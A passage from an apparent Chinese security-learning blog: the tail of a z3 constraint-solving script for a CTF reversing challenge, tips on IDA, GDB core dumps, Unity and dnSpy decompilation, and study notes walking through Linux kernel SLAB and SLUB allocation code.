class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">30</span> * v11 + -<span class="number">70</span> * v9 + -<span class="number">122</span> * v6 + -<span class="number">81</span> * v7 + -<span class="number">66</span> * v5 + -<span class="number">115</span> * v4 + -<span class="number">41</span> * v3 + -<span class="number">86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == -<span class="number">54400</span>)</span><br><span class="line">s.add(-<span class="number">103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + -<span class="number">89</span> * v3 + <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (</span><br><span class="line">            v6 * <span class="number">64</span>) - <span class="number">120</span> * v9 == -<span class="number">10283</span>)</span><br><span class="line">s.add(<span class="number">71</span> * v6 + (v7 * <span class="number">128</span>) + <span class="number">99</span> * v5 + -<span class="number">111</span> * v3 + <span class="number">85</span> * v1 + <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span>)</span><br><span class="line">s.add(<span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + -<span class="number">19</span> * v6 + <span class="number">99</span> * v7 + -<span class="number">117</span> * v5 + -<span class="number">69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == -<span class="number">2944</span>)</span><br><span class="line">s.add(-<span class="number">54</span> * v11 + -<span class="number">23</span> * v8 + -<span class="number">82</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">124</span> * v1 - <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == -<span class="number">2222</span>)</span><br><span class="line">s.add(-<span class="number">83</span> * v11 + -<span class="number">111</span> * v7 + -<span class="number">57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 - <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == -<span class="number">13258</span>)</span><br><span class="line">s.add(<span class="number">81</span> * v11 + -<span class="number">48</span> * v9 + <span class="number">66</span> * v8 + -<span class="number">104</span> * v6 + -<span class="number">121</span> * v7 + <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">80</span> * v1 == -<span class="number">1559</span>)</span><br><span class="line">s.add(<span class="number">101</span> * v11 + -<span class="number">85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + -<span class="number">83</span> * v5 + -<span class="number">101</span> * v4 + <span class="number">90</span> * v3 + -<span class="number">28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span>)</span><br><span class="line">s.add(<span class="number">99</span> * v11 + -<span class="number">28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + -<span class="number">18</span> * v7 + -<span class="number">127</span> * v5 + <span class="number">6</span> * v4 + -<span class="number">9</span> * v3 + -<span class="number">93</span> * v1 + <span class="number">58</span> * v2 == -<span class="number">1697</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    result = s.model()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></div></figure>




        <h1 id="TIPS"   >
          <a href="#TIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1>
      
        <h2 id="1-windows的API手册"   >
          <a href="#1-windows的API手册" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-windows的API手册" class="headerlink" title="1.windows的API手册"></a>1.windows的API手册</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/apiindex/windows-api-list" >Windows API 索引 - Win32 apps | Microsoft Docs</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="2-IDA-python"   >
          <a href="#2-IDA-python" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-IDA-python" class="headerlink" title="2.IDA-python"></a>2.IDA-python</h2>
      
        <h2 id="3-GDB转储调试"   >
          <a href="#3-GDB转储调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-GDB转储调试" class="headerlink" title="3.GDB转储调试"></a>3.GDB转储调试</h2>
      <ul>
<li>生成：<code>generate-core-file</code>生成<code>core</code>文件</li>
<li>调试：<code>gdb programer core_file</code></li>
</ul>

        <h2 id="4-Unity游戏逆向"   >
          <a href="#4-Unity游戏逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Unity游戏逆向" class="headerlink" title="4.Unity游戏逆向"></a>4.Unity游戏逆向</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-495115-1-1.html" >https://www.52pojie.cn/thread-495115-1-1.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="5-最长反编译修改"   >
          <a href="#5-最长反编译修改" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-最长反编译修改" class="headerlink" title="5.最长反编译修改"></a>5.最长反编译修改</h2>
      <p>有时候当一个函数太长，就会导致IDA反编译失败，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230726151414182.png" alt="image-20230726151414182"></p>
<p>这个可以通过设置IDA目录下的hexrays.cfg配置文件来设置最大反编译的代码长度，如下，将MAX_FUNCSIZE修改为1024即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230726151344840.png" alt="image-20230726151344840"></p>

        <h2 id="6-安卓Unity"   >
          <a href="#6-安卓Unity" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-安卓Unity" class="headerlink" title="6.安卓Unity"></a>6.安卓Unity</h2>
      <p>核心逻辑一般在bin\Data\Managed\Assembly-CSharp.dll，题目为[MRCTF2020]PixelShooter</p>

        <h2 id="7-C-Net反编译"   >
          <a href="#7-C-Net反编译" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-C-Net反编译" class="headerlink" title="7.C#/.Net反编译"></a>7.C#/.Net反编译</h2>
      <p>可以用dnspy，在github上有<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dnSpy/dnSpy/releases" >Releases · dnSpy/dnSpy (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>题目见：FlareOn1-Bob_Doge，可以调试的</p>
<ul>
<li>右键-转到入口点</li>
<li>开始分析</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230801144313490.png" alt="image-20230801144313490"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230801144322604.png" alt="image-20230801144322604"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/04/01/kernel%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%AC%94%E8%AE%B0/">Linux内核内存分配笔记</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-04-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h1>
      <p><code>Linux</code>内核的内存分配很复杂，单独开篇来慢慢记录。</p>

        <h1 id="SLAB"   >
          <a href="#SLAB" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLAB" class="headerlink" title="SLAB"></a>SLAB</h1>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/tolimit/p/4566189.html?utm_source=tuicool&utm_medium=referral" >linux内存源码分析 - SLAB分配器概述 - tolimit - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>函数链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kmem_cache_alloc()-&gt;slab_alloc()-&gt;__do_cache_alloc()-&gt;__cache_alloc()</span><br></pre></td></tr></table></div></figure>

<p>最终在<code>__cache_alloc</code>进行实际的内存分配，在这进行分配分叉点。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.8 /mm/slab.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *____cache_alloc(struct kmem_cache *cachep, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span> *objp;</span><br><span class="line">    <span class="comment">//当前slab描述符的对象缓冲池</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">ac</span>;</span></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">    <span class="comment">//获取缓冲池,实际上为对应的</span></span><br><span class="line">    <span class="comment">//CPU_addr+kmalloc_caches[xx][xx].cpu_cache</span></span><br><span class="line">    <span class="comment">//这个kmalloc_caches[xx][xx]即为对应大小的slab描述符</span></span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line">    <span class="comment">//如果存在可用的,就直接进行分配-------freelist式分配</span></span><br><span class="line">	<span class="keyword">if</span> (likely(ac-&gt;avail)) &#123;</span><br><span class="line">		ac-&gt;touched = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//这里即把avail也当作一个idx进行索引了</span></span><br><span class="line">		objp = ac-&gt;entry[--ac-&gt;avail];</span><br><span class="line">		STATS_INC_ALLOCHIT(cachep);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	STATS_INC_ALLOCMISS(cachep);</span><br><span class="line">    <span class="comment">//不存在的话,则进入另一种分配--------其他缓冲池分配</span></span><br><span class="line">	objp = cache_alloc_refill(cachep, flags);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * the &#x27;ac&#x27; may be updated by cache_alloc_refill(),</span></span><br><span class="line"><span class="comment">	 * and kmemleak_erase() requires its correct value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * To avoid a false negative, if an object that is in one of the</span></span><br><span class="line"><span class="comment">	 * per-CPU caches is leaked, we need to make sure kmemleak doesn&#x27;t</span></span><br><span class="line"><span class="comment">	 * treat the array pointers as a reference to the object.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (objp)</span><br><span class="line">		kmemleak_erase(&amp;ac-&gt;entry[ac-&gt;avail]);</span><br><span class="line">	<span class="keyword">return</span> objp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="1-本地缓冲池分配"   >
          <a href="#1-本地缓冲池分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-本地缓冲池分配" class="headerlink" title="1.本地缓冲池分配"></a>1.本地缓冲池分配</h2>
      <p>这个就不多说了，依据<code>CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.entry</code>当作一个<code>array_cache</code>进行分配，分配一个即将对应的<code>array_cache.avail</code>减1。</p>

        <h2 id="2-其他缓冲池分配"   >
          <a href="#2-其他缓冲池分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-其他缓冲池分配" class="headerlink" title="2.其他缓冲池分配"></a>2.其他缓冲池分配</h2>
      <p>进入<code>cache_alloc_refill()</code>函数，还是会有相关的分叉</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /mm/slab.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">cache_alloc_refill</span><span class="params">(struct kmem_cache *cachep, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> batchcount;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">ac</span>, *<span class="title">shared</span>;</span></span><br><span class="line">	<span class="keyword">int</span> node;</span><br><span class="line">	<span class="keyword">void</span> *<span class="built_in">list</span> = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">	check_irq_off();</span><br><span class="line">    <span class="comment">//获取node节点id和array_cache相关信息</span></span><br><span class="line">	node = numa_mem_id();</span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line">	batchcount = ac-&gt;batchcount;</span><br><span class="line">  	<span class="comment">//不知道干啥的</span></span><br><span class="line">	<span class="keyword">if</span> (!ac-&gt;touched &amp;&amp; batchcount &gt; BATCHREFILL_LIMIT) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If there was little recent activity on this cache, then</span></span><br><span class="line"><span class="comment">		 * perform only a partial refill.  Otherwise we could generate</span></span><br><span class="line"><span class="comment">		 * refill bouncing.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		batchcount = BATCHREFILL_LIMIT;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//真实的node节点指针</span></span><br><span class="line">	n = get_node(cachep, node);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	BUG_ON(ac-&gt;avail &gt; <span class="number">0</span> || !n);</span><br><span class="line">    <span class="comment">//尝试从共享对象缓冲池shared_entry进行分配</span></span><br><span class="line">	shared = READ_ONCE(n-&gt;shared);</span><br><span class="line">	<span class="keyword">if</span> (!n-&gt;free_objects &amp;&amp; (!shared || !shared-&gt;avail))</span><br><span class="line">		<span class="keyword">goto</span> direct_grow;</span><br><span class="line">	<span class="comment">//相关自旋锁</span></span><br><span class="line">	spin_lock(&amp;n-&gt;list_lock);</span><br><span class="line">	shared = READ_ONCE(n-&gt;shared);</span><br><span class="line">	<span class="comment">/* See if we can refill from the shared array */</span></span><br><span class="line">    <span class="comment">//transfer_objects()函数会从共享对象缓冲池shared_entry</span></span><br><span class="line">    <span class="comment">//转移batchcount个空闲对象到本地缓冲池进行分配</span></span><br><span class="line">	<span class="keyword">if</span> (shared &amp;&amp; transfer_objects(ac, shared, batchcount)) &#123;</span><br><span class="line">        <span class="comment">//为什么设置touched?</span></span><br><span class="line">		shared-&gt;touched = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">goto</span> alloc_done;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//共享对象缓冲池shared_entry没有空闲对象时,查看</span></span><br><span class="line">	<span class="comment">//slabs_partial(部分空闲)链表和slabs_free(全部空闲)链表</span></span><br><span class="line">	<span class="keyword">while</span> (batchcount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* Get slab alloc is to come from. */</span></span><br><span class="line">        <span class="comment">//进入实际分配函数</span></span><br><span class="line">		page = get_first_slab(n, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//如果slabs_partial(部分空闲)链表和slabs_free(全部空闲)链表</span></span><br><span class="line">        <span class="comment">//都没有则重新分配一个slab及对应空间</span></span><br><span class="line">		<span class="keyword">if</span> (!page)</span><br><span class="line">			<span class="keyword">goto</span> must_grow;</span><br><span class="line"></span><br><span class="line">		check_spinlock_acquired(cachep);</span><br><span class="line"></span><br><span class="line">		batchcount = alloc_block(cachep, ac, page, batchcount);</span><br><span class="line">		fixup_slab_list(cachep, n, page, &amp;<span class="built_in">list</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重新分配一个slab</span></span><br><span class="line">must_grow:</span><br><span class="line">	n-&gt;free_objects -= ac-&gt;avail;</span><br><span class="line">alloc_done:</span><br><span class="line">	spin_unlock(&amp;n-&gt;list_lock);</span><br><span class="line">	fixup_objfreelist_debug(cachep, &amp;<span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">direct_grow:</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!ac-&gt;avail)) &#123;</span><br><span class="line">		<span class="comment">/* Check if we can use obj in pfmemalloc slab */</span></span><br><span class="line">		<span class="keyword">if</span> (sk_memalloc_socks()) &#123;</span><br><span class="line">			<span class="keyword">void</span> *obj = cache_alloc_pfmemalloc(cachep, n, flags);</span><br><span class="line">			<span class="keyword">if</span> (obj)</span><br><span class="line">				<span class="keyword">return</span> obj;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		page = cache_grow_begin(cachep, gfp_exact_node(flags), node);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * cache_grow_begin() can reenable interrupts,</span></span><br><span class="line"><span class="comment">		 * then ac could change.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ac = cpu_cache_get(cachep);</span><br><span class="line">		<span class="keyword">if</span> (!ac-&gt;avail &amp;&amp; page)</span><br><span class="line">			alloc_block(cachep, ac, page, batchcount);</span><br><span class="line">		cache_grow_end(cachep, page);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ac-&gt;avail)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ac-&gt;touched = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ac-&gt;entry[--ac-&gt;avail];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="①shared缓存池分配"   >
          <a href="#①shared缓存池分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#①shared缓存池分配" class="headerlink" title="①shared缓存池分配"></a>①shared缓存池分配</h3>
      <p>尝试将<code>kmalloc_caches[xx][xx].node.shared.entry</code>当作一个<code>array_cache</code>进行检测，尝试分配</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220517162554930.png" alt="image-20220517162554930"></p>

        <h3 id="②slabs-partial和slabs-free分配"   >
          <a href="#②slabs-partial和slabs-free分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#②slabs-partial和slabs-free分配" class="headerlink" title="②slabs_partial和slabs_free分配"></a>②slabs_partial和slabs_free分配</h3>
      <p>在<code>get_first_slab()</code>函数中进行分配，尝试获取一个<code>slab</code>页框描述符，依据相关索引，从其中的<code>page-&gt;mapping</code>开始获取堆块对象<code>obj</code>，挨个转移到对应<code>CPU</code>的<code>kmalloc-xx</code>的<code>array_cache</code>（即对应的本地缓冲池中）。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /mm/slab.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct page *<span class="title">get_first_slab</span><span class="params">(struct kmem_cache_node *n, <span class="keyword">bool</span> pfmemalloc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    </span><br><span class="line">	assert_spin_locked(&amp;n-&gt;list_lock);</span><br><span class="line">	page = list_first_entry_or_null(&amp;n-&gt;slabs_partial, struct page,slab_list);</span><br><span class="line">	<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">		n-&gt;free_touched = <span class="number">1</span>;</span><br><span class="line">		page = list_first_entry_or_null(&amp;n-&gt;slabs_free, struct page,</span><br><span class="line">						slab_list);</span><br><span class="line">		<span class="keyword">if</span> (page)</span><br><span class="line">			n-&gt;free_slabs--;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks())</span><br><span class="line">		page = get_valid_first_slab(n, page, pfmemalloc);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-重新分配一个slab"   >
          <a href="#3-重新分配一个slab" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-重新分配一个slab" class="headerlink" title="3.重新分配一个slab"></a>3.重新分配一个slab</h2>
      <p>上面也提到，进入到<code>must_grow</code>即进行<code>slab</code>的重新分配，这个着实有点复杂，不是很会，涉及ZONE、NODE什么之类的数据结构，还有NUMA机制之类的。</p>

        <h1 id="SLUB"   >
          <a href="#SLUB" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUB" class="headerlink" title="SLUB"></a>SLUB</h1>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/166649492" >Linux内存管理：slub分配器 - 知乎 (zhihu.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>函数链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kmem_cache_alloc()-&gt;slab_alloc()-&gt;slab_alloc_node()</span><br></pre></td></tr></table></div></figure>

<p>从<code>slab_alloc_node()</code>函数开始分配</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /mm/slub.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc_node</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *object;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">obj_cgroup</span> *<span class="title">objcg</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取对应的kmem_cache描述符</span></span><br><span class="line">	s = slab_pre_alloc_hook(s, &amp;objcg, <span class="number">1</span>, gfpflags);</span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">redo:</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//尝试从本地缓冲池进行分配</span></span><br><span class="line">	object = c-&gt;freelist;</span><br><span class="line">	page = c-&gt;page;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!object || !node_match(page, node))) &#123;</span><br><span class="line">        <span class="comment">//本地缓冲池已分配完毕</span></span><br><span class="line">        <span class="comment">//分配不成功就进入后续的__slab_alloc()函数</span></span><br><span class="line">		object = __slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">		stat(s, ALLOC_SLOWPATH);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//相关SLUB保护的指针运算</span></span><br><span class="line">		<span class="keyword">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line">		<span class="comment">//...一大堆检查</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//一大堆检查看不太懂</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="1-本地缓冲池分配-1"   >
          <a href="#1-本地缓冲池分配-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-本地缓冲池分配-1" class="headerlink" title="1.本地缓冲池分配"></a>1.本地缓冲池分配</h2>
      <p>这个就不说了，直接就是从本地的<code>kmem_cache_cpu</code>下<code>cpu_slab</code>的<code>freelist</code>开始分配，上面的<code>slab_alloc_node()</code>函数中也相关体现了。</p>
<p>之后在<code>__slab_alloc()</code>函数中进行相关判断后会进入到<code>___slab_alloc()</code>函数，进行后续的不同情况判断。不是很懂在干嘛，和<code>CONFIG_PREEMPTION</code>配置有关。</p>
